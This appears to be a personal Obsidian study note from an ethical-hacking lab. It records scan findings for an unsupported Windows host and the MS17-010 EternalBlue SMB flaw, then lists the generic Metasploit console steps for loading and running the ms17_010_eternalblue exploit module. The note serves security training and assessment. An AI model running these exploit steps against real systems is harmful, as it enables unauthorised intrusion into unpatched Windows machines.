---
tags:
- blue
- Assessment
- Findings/Vulnerabilities
- EH
MOC: Technology
---
[[_0000 Home|Home]] | [[_0005 Cybersecurity MOC|Back to Cybersecurity MOC]] | [[EH AS Blue index|Back to index]]
### Critical vulneraility - Unsupported Windows OS
![[Screenshot from 2025-09-20 17-30-02.png]]
### High vulnerability -  MS17-010: Security Update for Microsoft Windows SMB Server (4013389) (ETERNALBLUE) (ETERNALCHAMPION) (ETERNALROMANCE) (ETERNALSYNERGY) (WannaCry) (EternalRocks) (Petya) (uncredentialed check)
![[Screenshot from 2025-09-20 17-30-52.png]]
![[Screenshot from 2025-09-20 17-31-06.png]]
    msf > use exploit/windows/smb/ms17_010_eternalblue
    msf exploit(ms17_010_eternalblue) > show targets
        ...targets...
    msf exploit(ms17_010_eternalblue) > set TARGET < target-id >
    msf exploit(ms17_010_eternalblue) > show options
        ...show and set options...
    msf exploit(ms17_010_eternalblue) > exploit